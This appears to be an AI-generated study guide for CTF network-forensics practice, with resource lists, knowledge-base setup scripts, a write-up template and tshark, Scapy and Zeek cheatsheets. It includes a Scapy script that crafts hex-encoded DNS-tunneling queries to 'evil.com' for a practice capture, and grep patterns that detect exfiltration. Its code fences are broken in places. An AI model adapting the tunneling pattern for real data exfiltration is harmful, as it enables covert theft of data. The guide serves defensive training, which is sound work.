# 1. Wireshark Q&A Site
# URL: https://ask.wireshark.org
# Active forum for Wireshark-specific questions

# Common question categories:
# - Display filter syntax
# - Protocol dissector issues
# - Performance optimization
# - Custom dissector development

# Searching for solutions:
# Site-specific Google search:
# site:ask.wireshark.org "extract files from PCAP"

# 2. Wireshark-dev Mailing List
# For developers and advanced users
# URL: https://www.wireshark.org/lists/

# 3. Wireshark GitLab
# URL: https://gitlab.com/wireshark/wireshark
# Issue tracking and feature requests
# Source code for learning dissector development
```

**NetworkMiner Community:**

```bash
# Netresec Resources
# URL: https://www.netresec.com/?page=Blog

# NetworkMiner Forum
# URL: https://www.netresec.com/forum/

# Common topics:
# - Artifact extraction
# - Operating system fingerprinting
# - Credential extraction
# - Custom parser development
```

### Conference Talks and Presentations

**Recorded Conference Sessions:**

```bash
cat > conference_resources.txt << 'EOF'
Security Conferences with Network Analysis Content
==================================================

Major Conferences (YouTube Archives):

1. DEF CON
   URL: https://www.youtube.com/user/DEFCONConference
   Search: "PCAP", "network forensics", "packet analysis"
   Notable talks:
   - "Practical Packet Analysis" series
   - Network forensics workshops

2. Black Hat
   URL: https://www.youtube.com/c/BlackHatOfficialYT
   Search: "network security", "traffic analysis"
   Enterprise-focused, high-quality technical content

3. ShmooCon
   URL: https://www.youtube.com/user/ShmooCon
   Smaller conference, practical talks

4. BSides (Various Cities)
   URL: Search "BSides [city] YouTube"
   Community-driven, diverse topics
   Often includes beginner-friendly content

5. SANS Webinars
   URL: https://www.sans.org/webcasts/
   Free educational webinars
   Regular network security topics

6. FIRST Conference
   URL: https://www.first.org/conference/
   Incident response focus
   Traffic analysis techniques

7. AusCERT
   URL: https://conference.auscert.org.au
   Asia-Pacific security conference

Searching for Relevant Talks:
- "PCAP analysis techniques"
- "Network forensics case studies"
- "Wireshark advanced features"
- "Malware traffic detection"
- "Protocol reverse engineering"

Download for Offline Viewing:
# Using youtube-dl/yt-dlp
yt-dlp "https://www.youtube.com/watch?v=VIDEO_ID"

Creating Personal Learning Library:
mkdir -p ~/security_talks/network_analysis
cd ~/security_talks/network_analysis
# Download relevant talks
# Organize by topic/difficulty
EOF

cat conference_resources.txt
```

### Certification Preparation Resources

**Relevant Certifications:**

```bash
cat > certifications_guide.txt << 'EOF'
Network Analysis Relevant Certifications
========================================

1. Wireshark Certified Network Analyst (WCNA)
   Provider: Wireshark University / Laura Chappell
   Focus: Deep Wireshark expertise
   Exam: Practical PCAP analysis
   Prep: Official course + practice PCAPs
   Cost: ~$795 (course) + $125 (exam)

2. GIAC Network Forensic Analyst (GNFA)
   Provider: SANS/GIAC
   Focus: Network forensics and incident response
   Exam: Practical scenarios
   Prep: SANS FOR572 course recommended
   Cost: ~$8,000+ (course) or $2,000 (exam only)

3. Certified Ethical Hacker (CEH)
   Provider: EC-Council
   Focus: Includes packet sniffing/analysis modules
   Network traffic analysis is subset
   Cost: ~$1,199 (exam)

4. CompTIA CySA+ (Cybersecurity Analyst)
   Provider: CompTIA
   Focus: Security analytics including traffic analysis
   Entry-level friendly
   Cost: ~$392 (exam)

5. Offensive Security Certified Professional (OSCP)
   Provider: Offensive Security
   Focus: Penetration testing (includes traffic capture)
   Practical exam environment
   Cost: ~$1,649 (course + exam)

6. Certified Information Systems Security Professional (CISSP)
   Provider: (ISC)²
   Focus: Broad security (includes network security domain)
   Management-oriented with technical depth
   Cost: ~$749 (exam)

Free/Low-Cost Alternatives:
- TryHackMe certificates (learning paths)
- Hack The Box certifications (CPTS, CDSA)
- Coursera/edX course certificates

Certification Study Resources:
- Official practice exams
- Community study groups (Reddit, Discord)
- Practice PCAPs from challenges
- Lab environment setup

Recommendation:
Start with: CTF challenges + community learning
Then consider: WCNA or CySA+ (depending on career path)
Advanced: GNFA for forensics focus, OSCP for offensive

[Unverified] Actual exam difficulty and passing rates vary; 
consult recent test-taker reviews before committing.
EOF

cat certifications_guide.txt
```

### Resource Management System

**Personal Knowledge Base Setup:**

```bash
cat > setup_knowledge_base.sh << 'EOF'
#!/bin/bash

# Create organized structure for CTF resources

BASE_DIR=~/ctf_network_analysis

echo "[*] Setting up CTF Network Analysis Knowledge Base"

# Create directory structure
mkdir -p $BASE_DIR/{pcaps,tools,docs,writeups,scripts,challenges}
mkdir -p $BASE_DIR/pcaps/{malware,protocols,ctf,practice}
mkdir -p $BASE_DIR/docs/{cheatsheets,rfc,tutorials}
mkdir -p $BASE_DIR/writeups/{htb,thm,cyberdefenders,other}
mkdir -p $BASE_DIR/tools/{wireshark_plugins,custom_scripts}

# Create index files
cat > $BASE_DIR/README.md << 'INDEX'
# CTF Network Analysis Knowledge Base

## Directory Structure
```

ctf_network_analysis/ ├── pcaps/ # Practice PCAP files │ ├── malware/ # Malware traffic samples │ ├── protocols/ # Protocol learning examples │ ├── ctf/ # CTF challenge files │ └── practice/ # Self-generated practice files ├── tools/ # Custom tools and plugins │ ├── wireshark_plugins/ │ └── custom_scripts/ ├── docs/ # Documentation and references │ ├── cheatsheets/ │ ├── rfc/ # Protocol specifications │ └── tutorials/ ├── writeups/ # Challenge solutions │ ├── htb/ │ ├── thm/ │ ├── cyberdefenders/ │ └── other/ ├── scripts/ # Automation scripts └── challenges/ # Active challenges

```

## Quick Links
- [Platform Accounts](./accounts.md)
- [Learning Roadmap](./roadmap.md)
- [Tool Inventory](./tools.md)
- [Progress Tracker](./progress.md)

## Resources
- [Blogs to Follow](./docs/blogs.txt)
- [YouTube Channels](./docs/youtube.txt)
- [Community Discord Servers](./docs/discord.txt)
INDEX

# Create progress tracker
cat > $BASE_DIR/progress.md << 'PROGRESS'
# Learning Progress Tracker

## Skills Assessment
| Skill | Level | Notes |
|-------|-------|-------|
| Wireshark Basics | [  ] | Display filters, following streams |
| Protocol Analysis | [  ] | HTTP, DNS, TLS, etc. |
| File Extraction | [  ] | Carving files from traffic |
| Malware Traffic | [  ] | C2 detection, indicators |
| Custom Protocols | [  ] | Reverse engineering unknown protocols |
| Scripting | [  ] | Automation with tshark/Python |

Levels: Beginner / Intermediate / Advanced / Expert

## Challenges Completed
| Date | Platform | Challenge | Difficulty | Time | Notes |
|------|----------|-----------|------------|------|-------|
| | | | | | |

## Monthly Goals
### Current Month: [Month Year]
- [ ] Complete 4 HTB forensics challenges
- [ ] Solve 1 Malware-Traffic-Analysis exercise per week
- [ ] Learn new tool: [tool name]
- [ ] Write 2 detailed writeups

## Resources to Review
- [ ] SANS ISC Diary entries (weekly)
- [ ] New Wireshark version release notes
- [ ] Unit 42 latest blog posts
- [ ] TryHackMe new network rooms

## Questions / Topics to Research
1. 
2. 
3. 
PROGRESS

# Create tool inventory
cat > $BASE_DIR/tools.md << 'TOOLS'
# Tool Inventory

## Installed Tools
| Tool | Version | Purpose | Install Date | Notes |
|------|---------|---------|--------------|-------|
| Wireshark | | PCAP GUI analysis | | |
| tshark | | CLI packet analysis | | |
| tcpdump | | Packet capture | | |
| NetworkMiner | | Network forensics | | |
| Zeek | | Network security monitor | | |

## Custom Scripts
| Script | Language | Purpose | Location |
|--------|----------|---------|----------|
| | | | |

## Wireshark Plugins
| Plugin | Purpose | Source | Installed |
|--------|---------|--------|-----------|
| | | | [ ] |

## Planned Installations
- [ ] Tool 1: Purpose
- [ ] Tool 2: Purpose
TOOLS

# Create accounts tracker
cat > $BASE_DIR/accounts.md << 'ACCOUNTS'
# Platform Accounts

| Platform | Username | Joined | Points/Rank | Notes |
|----------|----------|--------|-------------|-------|
| Hack The Box | | | | |
| TryHackMe | | | | |
| CyberDefenders | | | | |
| PicoCTF | | | | |
| CTFtime Team | | | | |

## API Keys / Tokens
- HTB API: [location of secure storage]
- VirusTotal: [if applicable]

**Security Note:** Never commit actual credentials to Git repos
ACCOUNTS

# Create roadmap
cat > $BASE_DIR/roadmap.md << 'ROADMAP'
# Learning Roadmap

## Phase 1: Foundations (Weeks 1-4)
- [ ] Complete TryHackMe Wireshark 101 room
- [ ] Practice with Wireshark sample captures
- [ ] Learn basic display filters
- [ ] Understand TCP/IP fundamentals
- [ ] Follow first TCP stream
- [ ] Extract first HTTP object

## Phase 2: Protocol Mastery (Weeks 5-8)
- [ ] Deep dive into HTTP/HTTPS analysis
- [ ] DNS query analysis
- [ ] FTP credential extraction
- [ ] SMB traffic analysis
- [ ] Email protocols (SMTP, POP3, IMAP)
- [ ] Complete 5 protocol-specific challenges

## Phase 3: Malware Traffic (Weeks 9-12)
- [ ] Malware-Traffic-Analysis.net exercises (×4)
- [ ] Identify C2 traffic patterns
- [ ] Learn encryption indicators
- [ ] Practice IOC extraction
- [ ] Document malware families

## Phase 4: Advanced Techniques (Weeks 13-16)
- [ ] Custom protocol reverse engineering
- [ ] Encrypted traffic analysis (where possible)
- [ ] Large PCAP handling optimization
- [ ] Script automation with tshark
- [ ] Create custom Wireshark dissector

## Phase 5: CTF Application (Ongoing)
- [ ] HTB forensics challenges (×10)
- [ ] CyberDefenders scenarios (×5)
- [ ] Live CTF participation
- [ ] Write detailed writeups
- [ ] Contribute to community

## Continuous Learning
- Weekly: Malware-Traffic-Analysis challenge
- Monthly: Unit 42 Wireshark quiz
- Daily: SANS ISC Diary (15 min read)
- Quarterly: Review and update this roadmap
ROADMAP

echo "[+] Knowledge base structure created at: $BASE_DIR"
echo "[+] Edit markdown files to customize your learning journey"
echo "[+] Initialize Git repo: cd $BASE_DIR && git init"
EOF

chmod +x setup_knowledge_base.sh
./setup_knowledge_base.sh
```

### Resource Validation and Updates

**Keeping Resources Current:**

```bash
cat > check_resources.sh << 'EOF'
#!/bin/bash

# Check if key resources are still accessible

echo "Resource Availability Checker"
echo "=============================="

check_url() {
    url="$1"
    name="$2"
    
    if curl -s --head "$url" | head -n 1 | grep "HTTP/[12].[01] [23].." > /dev/null; then
        echo "[✓] $name: ONLINE"
    else
        echo "[✗] $name: OFFLINE or MOVED"
    fi
}

echo -e "\n[*] Checking CTF Platforms:"
check_url "https://www.hackthebox.com" "Hack The Box"
check_url "https://tryhackme.com" "TryHackMe"
check_url "https://cyberdefenders.org" "CyberDefenders"
check_url "https://picoctf.org" "PicoCTF"

echo -e "\n[*] Checking PCAP Repositories:"
check_url "https://www.malware-traffic-analysis.net" "Malware-Traffic-Analysis"
check_url "https://www.netresec.com/?page=PcapFiles" "Netresec PCAP Files"
check_url "https://wiki.wireshark.org/SampleCaptures" "Wireshark Samples"

echo -e "\n[*] Checking Documentation:"
check_url "https://www.wireshark.org/docs/" "Wireshark Docs"
check_url "https://ask.wireshark.org" "Wireshark Q&A"

echo -e "\n[*] Checking Blogs:"
check_url "https://unit42.paloaltonetworks.com" "Unit 42"
check_url "https://isc.sans.edu" "SANS ISC"
check_url "https://www.netresec.com/?page=Blog" "Netresec Blog"

echo -e "\n[*] Check complete"
echo "[!] If resources are offline, search for mirrors or archives"
EOF

chmod +x check_resources.sh

# Run monthly to verify resource availability
```

### Important Recommended Study Sequence

1. **Weeks 1-2**: TryHackMe Wireshark basics + Wireshark sample captures
2. **Weeks 3-4**: Protocol-specific learning (HTTP, DNS, FTP)
3. **Weeks 5-6**: First CTF forensics challenges (PicoCTF/easy HTB)
4. **Weeks 7-8**: Malware-Traffic-Analysis.net exercises (start with training section)
5. **Weeks 9-12**: Regular CTF participation + CyberDefenders scenarios
6. **Ongoing**: Weekly challenges, community engagement, writeup creation

### Key Success Factors

- **Consistent Practice**: Daily 30-60 minutes better than weekend marathons
- **Document Everything**: Keep notes, create writeups (even for failures)
- **Community Engagement**: Ask questions, share findings, help others
- **Tool Mastery**: Focus on depth with core tools before breadth
- **Real-World Application**: Relate challenges to actual security scenarios

### Important Related Topics

- **Building a Home Lab**: Setting up VMs for traffic generation and capture
- **CTF Team Formation**: Finding or creating a team for collaborative learning
- **Writeup Creation**: Documenting solutions for portfolio building
- **Tool Development**: Creating custom analysis scripts and plugins
- **Career Pathways**: Transitioning from CTF skills to professional roles (SOC analyst, forensics investigator, penetration tester)

---
## Write-up Analysis

### Purpose of CTF Write-up Study

Write-ups serve as post-competition learning materials that reveal:

- **Methodology**: How experts approach unfamiliar protocols
- **Tool Selection**: Which tools work best for specific scenarios
- **Mental Models**: Problem-solving patterns and analytical frameworks
- **Shortcuts**: Efficiency techniques that save time during competitions

### Systematic Write-up Analysis Framework

**Step 1: Pre-Reading Assessment**

```
Before reading the solution, attempt to:
1. Download challenge files if available
2. Spend 30-60 minutes on initial analysis
3. Document your approach and findings
4. Note where you got stuck

This creates context for understanding why certain techniques were chosen.
```

**Step 2: Structured Reading Process**

Create analysis template (`writeup_analysis.md`):

````markdown
# Write-up Analysis: [Challenge Name]

## Metadata
- **Event**: [CTF Name + Year]
- **Category**: Network Traffic Analysis
- **Difficulty**: [Easy/Medium/Hard]
- **Points**: [Original point value]
- **Solves**: [Number of teams that solved it]

## Challenge Summary
[Brief description of the challenge objective]

## Author's Approach

### Initial Analysis
- **Tools Used**: [List tools mentioned]
- **First Observations**: [What did they notice first?]
- **Key Insight**: [What was the breakthrough moment?]

### Detailed Solution Steps
1. Step 1: [Action taken]
   - Tool: [Specific tool used]
   - Command: `[Exact command if provided]`
   - Output: [What was discovered]
   - Why this worked: [Your analysis]

2. Step 2: [Next action]
   - [Continue pattern]

### Flag Extraction
- **Method**: [How flag was obtained]
- **Flag Format**: [Pattern observed]

## Personal Analysis

### What I Learned
- **New Technique**: [Specific technique not previously known]
- **Tool Usage**: [New way to use familiar tool]
- **Concept**: [Protocol/concept clarification]

### Alternative Approaches
- **Could have used**: [Different tool/method]
- **Trade-offs**: [Why author's approach was better/worse]

### Mistakes I Made
- [Where my initial approach failed]
- [Why I didn't see the solution]
- [What to watch for next time]

### Reproducibility
- [ ] Successfully reproduced all steps
- [ ] Encountered issues: [Document problems]
- [ ] Time taken: [How long reproduction took]

## Techniques for Future Reference

### Reusable Commands
```bash
# Command that can be adapted to similar challenges
[Specific command with explanation]
````

### Patterns to Remember

- [Generalizable pattern from this challenge]

## Related Challenges

- [Similar challenges to practice]
- [Topics to study further]

````

### Curated Write-up Sources

**High-Quality CTF Write-up Repositories**:

1. **CTFtime Write-ups**:
   - https://ctftime.org/writeups
   - Filter by category: "Network" or "Forensics"
   - Look for highly-rated teams' solutions

2. **GitHub Collections**:
```bash
# Clone comprehensive write-up collections
git clone https://github.com/ctfs/write-ups-2024
git clone https://github.com/TFNS/writeups

# Search for network analysis write-ups
find . -name "*.md" -exec grep -l "wireshark\|pcap\|network" {} \;
````

3. **Team Blogs**:
    - Dragon Sector: https://blog.dragonsector.pl/
    - PPP (CMU): https://pwning.net/
    - Shellphish: https://shellphish.net/
    - [Inference] These teams consistently provide detailed technical write-ups

### Extracting Learning Value

**Technique Extraction Script**:

```python
#!/usr/bin/env python3
"""
Extract commands and techniques from markdown write-ups.
"""

import re
import sys
from pathlib import Path

def extract_commands(writeup_file):
    """
    Parse write-up and extract all shell commands and tool usage.
    """
    with open(writeup_file, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Extract code blocks
    code_blocks = re.findall(r'```(?:bash|shell|sh)?\n(.*?)```', 
                             content, re.DOTALL)
    
    techniques = {
        'tshark': [],
        'wireshark': [],
        'scapy': [],
        'python': [],
        'other': []
    }
    
    for block in code_blocks:
        lines = block.strip().split('\n')
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            # Categorize by tool
            if 'tshark' in line:
                techniques['tshark'].append(line)
            elif 'wireshark' in line:
                techniques['wireshark'].append(line)
            elif 'scapy' in line or 'from scapy' in line:
                techniques['scapy'].append(line)
            elif 'python' in line or line.endswith('.py'):
                techniques['python'].append(line)
            else:
                techniques['other'].append(line)
    
    return techniques

def extract_key_concepts(writeup_file):
    """
    Identify technical concepts mentioned in write-up.
    """
    with open(writeup_file, 'r', encoding='utf-8') as f:
        content = f.read().lower()
    
    concepts = {
        'protocols': re.findall(r'\b(tcp|udp|http|dns|tls|ssl|smtp|ftp|ssh)\b', content),
        'techniques': re.findall(r'\b(steganography|exfiltration|tunneling|covert|beacon)\b', content),
        'tools': re.findall(r'\b(wireshark|tshark|tcpdump|scapy|zeek|networkminer)\b', content),
        'formats': re.findall(r'\b(base64|hex|ascii|binary|json|xml)\b', content)
    }
    
    # Remove duplicates and count occurrences
    for category in concepts:
        concepts[category] = list(set(concepts[category]))
    
    return concepts

def main():
    if len(sys.argv) < 2:
        print("Usage: extract_techniques.py <writeup_file.md>")
        sys.exit(1)
    
    writeup = sys.argv[1]
    
    print(f"Analyzing: {writeup}\n")
    
    # Extract commands
    techniques = extract_commands(writeup)
    print("=== Commands by Tool ===")
    for tool, commands in techniques.items():
        if commands:
            print(f"\n{tool.upper()}:")
            for cmd in commands[:5]:  # Show first 5
                print(f"  {cmd}")
    
    # Extract concepts
    concepts = extract_key_concepts(writeup)
    print("\n\n=== Key Concepts ===")
    for category, items in concepts.items():
        if items:
            print(f"{category.title()}: {', '.join(items)}")

if __name__ == '__main__':
    main()
```

Usage:

```bash
# Analyze single write-up
python3 extract_techniques.py dragonsector_network_chall.md

# Batch analyze directory
find ./writeups -name "*.md" -exec python3 extract_techniques.py {} \; > techniques_summary.txt
```

### Building a Personal Knowledge Base

**Organized Storage Structure**:

```
ctf_writeups/
├── by_technique/
│   ├── dns_tunneling/
│   │   ├── challenge1_writeup.md
│   │   ├── challenge2_writeup.md
│   │   └── notes.md
│   ├── http_exfiltration/
│   ├── protocol_reversing/
│   └── encryption_analysis/
├── by_event/
│   ├── defcon_2024/
│   ├── plaidctf_2024/
│   └── googlectf_2024/
├── by_difficulty/
│   ├── beginner/
│   ├── intermediate/
│   └── advanced/
└── templates/
    ├── analysis_template.md
    └── command_cheatsheet.md
```

**Automated Organization Script**:

```bash
#!/bin/bash
# organize_writeups.sh - Categorize write-ups by technique

WRITEUP_DIR="$HOME/ctf_writeups"
mkdir -p "$WRITEUP_DIR"/{by_technique,by_event,by_difficulty}

# Function to detect techniques in write-up
detect_technique() {
    local file="$1"
    
    # Check for DNS tunneling indicators
    if grep -qi "dns.*tunnel\|dns.*exfil\|dns.*covert" "$file"; then
        echo "dns_tunneling"
    # Check for HTTP analysis
    elif grep -qi "http.*request\|http.*post\|user.agent" "$file"; then
        echo "http_analysis"
    # Check for protocol reversing
    elif grep -qi "unknown.*protocol\|reverse.*protocol\|custom.*protocol" "$file"; then
        echo "protocol_reversing"
    # Check for encryption
    elif grep -qi "decrypt\|cipher\|aes\|rsa\|xor" "$file"; then
        echo "encryption_analysis"
    else
        echo "general"
    fi
}

# Process all markdown files
find . -name "*.md" | while read writeup; do
    technique=$(detect_technique "$writeup")
    mkdir -p "$WRITEUP_DIR/by_technique/$technique"
    cp "$writeup" "$WRITEUP_DIR/by_technique/$technique/"
    echo "Categorized: $(basename "$writeup") -> $technique"
done
```

### Active Learning from Write-ups

**Challenge Reconstruction**: [Inference] When write-ups provide artifacts, reconstruct challenges locally:

```python
#!/usr/bin/env python3
"""
Reconstruct challenge from write-up description.
[Unverified] This assumes write-up provides enough detail.
"""

import socket
import struct

def create_challenge_pcap(output_file):
    """
    Generate synthetic traffic based on write-up description.
    Useful for practicing analysis techniques.
    """
    from scapy.all import *
    
    packets = []
    
    # Example: Recreate DNS tunneling scenario from write-up
    for i in range(10):
        # Craft DNS query with encoded data
        encoded_data = f"data{i}".encode().hex()
        query = f"{encoded_data}.evil.com"
        
        pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(
            rd=1,
            qd=DNSQR(qname=query)
        )
        packets.append(pkt)
    
    # Write to pcap
    wrpcap(output_file, packets)
    print(f"Created challenge pcap: {output_file}")

# Usage
create_challenge_pcap("practice_dns_tunnel.pcap")
```

**Technique Drilling**:

```bash
#!/bin/bash
# practice_technique.sh - Drill specific technique from write-up

TECHNIQUE="$1"
WRITEUP_DIR="$HOME/ctf_writeups/by_technique/$TECHNIQUE"

if [ ! -d "$WRITEUP_DIR" ]; then
    echo "Technique directory not found: $TECHNIQUE"
    exit 1
fi

echo "=== Practicing: $TECHNIQUE ==="
echo ""

# List all challenges for this technique
echo "Available challenges:"
ls -1 "$WRITEUP_DIR"/*.md 2>/dev/null | nl

echo ""
read -p "Select challenge number: " choice

# Extract the selected write-up
selected=$(ls -1 "$WRITEUP_DIR"/*.md | sed -n "${choice}p")

if [ -z "$selected" ]; then
    echo "Invalid selection"
    exit 1
fi

# Display challenge without solution
echo ""
echo "=== Challenge Description ==="
# Extract only the challenge description (before solution)
sed -n '/Challenge Summary/,/Author.*Approach/p' "$selected" | head -n -1

echo ""
echo "Press ENTER when ready to see solution..."
read

# Show full write-up
less "$selected"
```

### Write-up Contribution

**Creating High-Quality Write-ups**:

Template for your own write-ups:

```markdown
# [Challenge Name] - [CTF Event]

## Challenge Information
- **Category**: Network Traffic Analysis
- **Points**: 500
- **Solves**: 23/500 teams
- **Files**: [challenge.pcap](link)

## TL;DR
[One paragraph summary for quick reference]

## Challenge Description
```

[Paste original challenge text]

````

## Initial Analysis

### First Look at the Capture
```bash
# Basic statistics
capinfos challenge.pcap
````

Output:

```
File size:           12.5 MB
Data size:          11.8 MB
Packets:            8,432
Time span:          300 seconds
Average pps:        28.1
```

**Initial Observations**:

- Large number of DNS queries
- Most traffic to single destination IP
- [Include screenshot if helpful]

### Protocol Hierarchy

```bash
tshark -r challenge.pcap -q -z io,phs
```

Key finding: 95% DNS traffic (unusual)

## Detailed Solution

### Step 1: Identifying the Pattern

[Explain your thought process]

```bash
# Extract all DNS queries
tshark -r challenge.pcap -Y "dns.qry.name" -T fields -e dns.qry.name > queries.txt

# Analyze query patterns
cat queries.txt | cut -d'.' -f1 | sort -u
```

**Discovery**: Subdomain contains hex-encoded data

### Step 2: Data Extraction

```python
#!/usr/bin/env python3
# extract_data.py

import sys

def decode_dns_tunnel(queries_file):
    with open(queries_file, 'r') as f:
        for line in f:
            subdomain = line.strip().split('.')[0]
            try:
                decoded = bytes.fromhex(subdomain).decode()
                print(decoded, end='')
            except:
                pass

if __name__ == '__main__':
    decode_dns_tunnel(sys.argv[1])
```

```bash
python3 extract_data.py queries.txt > extracted.txt
```

### Step 3: Flag Recovery

[Final steps to get flag]

**Flag**: `CTF{dns_tunnels_everywhere}`

## Alternative Approaches

### Method 2: Using Zeek

[Unverified] This approach was not tested but should work:

```bash
zeek -r challenge.pcap
cat dns.log | zeek-cut query | cut -d'.' -f1 | xxd -r -p
```

### Method 3: Wireshark Display Filters

```
dns.qry.name contains "evil.com"
```

Then manually extract from packet details.

## Lessons Learned

### What Worked

- Immediately checked DNS due to high packet count
- Pattern recognition from previous DNS tunneling challenges
- Automated extraction script saved time

### What Didn't Work

- Initially tried to find HTTP exfiltration (wrong assumption)
- Spent 10 minutes on Wireshark GUI before switching to tshark (efficiency loss)

### Key Takeaways

1. **Always check protocol statistics first** - Would have saved initial misdirection
2. **DNS tunneling patterns** - Suspiciously long subdomains or high query volume
3. **Automation wins** - Manual extraction would have taken too long

## Tools Used

- tshark 4.0.6
- Python 3.11
- Wireshark 4.0.6 (initial analysis only)

## Related Challenges

- [CTF 2023] DNS Exfil (easier variant)
- [Other CTF] Advanced DNS Covert Channel (harder)

## References

- RFC 1035 (DNS Protocol)
- [DNS Tunneling Detection Techniques](https://example.com/)

## Files

- [challenge.pcap](https://claude.ai/chat/link) - Original capture
- [extract_data.py](https://claude.ai/chat/link) - Extraction script
- [queries.txt](https://claude.ai/chat/link) - Extracted DNS queries

````

**Publishing Your Write-ups**:
```bash
# Create GitHub repository for write-ups
mkdir ctf-writeups-2024
cd ctf-writeups-2024

# Organize by event
mkdir -p defcon/network/{challenge1,challenge2}

# Initialize git
git init
git add .
git commit -m "Initial write-ups"

# Push to GitHub
git remote add origin https://github.com/yourusername/ctf-writeups-2024
git push -u origin main

# Submit to CTFtime
# Navigate to event page and add write-up URL
````

## Tool Documentation

### Essential Documentation Resources

**Official Documentation**:

1. **Wireshark**:
    
    - User Guide: https://www.wireshark.org/docs/wsug_html_chunked/
    - Display Filter Reference: https://www.wireshark.org/docs/dfref/
    - Lua API: https://wiki.wireshark.org/Lua/Examples
2. **tshark**:
    
    - Man page: `man tshark`
    - Complete reference: https://www.wireshark.org/docs/man-pages/tshark.html
3. **Scapy**:
    
    - Official docs: https://scapy.readthedocs.io/
    - Layer reference: `ls()` in Scapy console
4. **Zeek**:
    
    - Documentation: https://docs.zeek.org/
    - Script reference: https://docs.zeek.org/en/master/scripts/

### Creating Personal Tool References

**Command Cheatsheet Structure**:

````markdown
# Network Traffic Analysis Tool Cheatsheet

## Quick Reference Table

| Task | Tool | Command |
|------|------|---------|
| Open pcap | Wireshark | `wireshark capture.pcap` |
| Basic stats | capinfos | `capinfos -c capture.pcap` |
| Extract HTTP | tshark | `tshark -r capture.pcap --export-objects http,./output` |
| Follow TCP | tshark | `tshark -r capture.pcap -z follow,tcp,ascii,0` |
| Parse with Zeek | Zeek | `zeek -r capture.pcap` |

## tshark - The Swiss Army Knife

### Display Filters
```bash
# By protocol
tshark -r file.pcap -Y "http"
tshark -r file.pcap -Y "dns"
tshark -r file.pcap -Y "tcp.port == 80"

# Logical operators
tshark -r file.pcap -Y "http and ip.addr == 192.168.1.1"
tshark -r file.pcap -Y "dns or http"
tshark -r file.pcap -Y "not arp"

# Content matching
tshark -r file.pcap -Y "http.request.uri contains admin"
tshark -r file.pcap -Y "dns.qry.name matches evil\\.com"
tshark -r file.pcap -Y "frame contains flag"
````

### Field Extraction

```bash
# Single field
tshark -r file.pcap -T fields -e http.host

# Multiple fields
tshark -r file.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport

# With separator
tshark -r file.pcap -T fields -E separator=, -e frame.time -e ip.src

# Unique values only
tshark -r file.pcap -T fields -e http.user_agent | sort -u

# Count occurrences
tshark -r file.pcap -T fields -e ip.dst | sort | uniq -c | sort -rn
```

### Statistics

```bash
# Protocol hierarchy
tshark -r file.pcap -q -z io,phs

# Conversations
tshark -r file.pcap -q -z conv,tcp
tshark -r file.pcap -q -z conv,udp

# Endpoints
tshark -r file.pcap -q -z endpoints,ip

# HTTP statistics
tshark -r file.pcap -q -z http,tree

# DNS statistics  
tshark -r file.pcap -q -z dns,tree
```

### Object Export

```bash
# HTTP objects
tshark -r file.pcap --export-objects http,./http_objects/

# SMB objects
tshark -r file.pcap --export-objects smb,./smb_files/

# DICOM objects
tshark -r file.pcap --export-objects dicom,./dicom_files/
```

### Output Formats

```bash
# JSON
tshark -r file.pcap -T json

# EK (Elasticsearch JSON)
tshark -r file.pcap -T ek

# PDML (XML)
tshark -r file.pcap -T pdml

# PS (PostScript)
tshark -r file.pcap -T ps

# CSV
tshark -r file.pcap -T fields -E header=y -E separator=,
```

### Scapy - Packet Crafting and Analysis

#### Reading Captures

```python
from scapy.all import *

## Read pcap
packets = rdpcap('capture.pcap')

## Iterate packets
for pkt in packets:
    if TCP in pkt:
        print(f"{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")

## Filter while reading
packets = rdpcap('capture.pcap', lambda x: TCP in x and x[TCP].dport == 80)
```

#### Packet Analysis

```python
## Check layers
pkt.show()
pkt.summary()
ls(pkt)

## Access fields
pkt[IP].src
pkt[TCP].flags
pkt[Raw].load

## Check if layer exists
if DNS in pkt:
    print(pkt[DNS].qd.qname)
```

#### Crafting Packets

```python
## Basic packet
pkt = IP(dst="192.168.1.1")/TCP(dport=80)

## HTTP GET
pkt = IP(dst="example.com")/TCP(dport=80, flags="PA")/Raw(load="GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")

## DNS query
pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))

## Send packet
send(pkt)
sr1(pkt)  ## Send and receive one response
```

#### Stream Extraction

```python
## Extract TCP streams
streams = {}
for pkt in packets:
    if TCP in pkt and Raw in pkt:
        stream_id = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        if stream_id not in streams:
            streams[stream_id] = []
        streams[stream_id].append(bytes(pkt[Raw].load))

## Reconstruct stream
for stream_id, data_list in streams.items():
    full_data = b''.join(data_list)
    print(f"Stream {stream_id}: {len(full_data)} bytes")
```

### Zeek - Network Security Monitor

#### Basic Usage

```bash
## Process pcap
zeek -r capture.pcap

## Process with specific scripts
zeek -r capture.pcap protocols/http/detect-webapps

## Process and extract files
zeek -r capture.pcap FileExtract::prefix=./extracted_files/

## List generated logs
ls -lh *.log
```

#### Log Analysis

```bash
## View conn.log (connections)
zeek-cut id.orig_h id.resp_h id.resp_p proto service < conn.log

## View HTTP requests
zeek-cut ts id.orig_h method host uri < http.log

## View DNS queries
zeek-cut ts id.orig_h query answers < dns.log

## View extracted files
zeek-cut fuid source mime_type filename < files.log

## Find suspicious connections
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes | \
    awk '$4 > 100 && $5 > 1000000'
```

#### Custom Scripts

```zeek
## Save as custom_extract.zeek
@load base/protocols/http

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    if (/flag/ in original_URI)
        print fmt("Potential flag in URI: %s", original_URI);
}

## Run with:
## zeek -r capture.pcap custom_extract.zeek
```

### NetworkMiner

#### CLI Usage (Pro Version)

[Unverified] Professional version syntax:

```bash
## Process pcap
NetworkMinerCLI.exe -r capture.pcap -o ./output/

## Extract files only
NetworkMinerCLI.exe -r capture.pcap --onlyExtractFiles -o ./files/
```

#### GUI Workflow

```
1. File → Open → Select pcap
2. Navigate tabs:
   - Hosts: View all endpoints
   - Files: Auto-extracted files
   - Images: Preview transferred images
   - Credentials: Captured auth
3. Right-click items for export
```

### tcpdump - Capture and Filter

#### Capture Filters

```bash
## By host
sudo tcpdump -i eth0 host 192.168.1.100

## By port
sudo tcpdump -i eth0 port 80

## By protocol
